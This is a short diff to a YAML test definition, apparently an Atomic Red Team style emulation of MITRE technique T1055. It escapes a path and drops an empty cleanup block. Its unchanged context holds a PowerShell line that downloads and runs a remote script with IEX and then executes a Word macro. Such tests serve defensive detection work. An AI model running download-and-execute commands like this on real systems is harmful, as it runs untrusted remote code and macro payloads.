@@ -9,7 +9,7 @@ description: |
 args:
     - name: txt_path
       type: path
-      default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
+      default: PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt
 uuid: 1c91e740-1729-4329-b779-feba6e71d048
 mitre:
     tactics:
@@ -46,6 +46,3 @@ steps:
         IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
         Invoke-Maldoc -macroFile "{{.Args.txt_path}}" -officeProduct "Word" -sub "Execute"
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
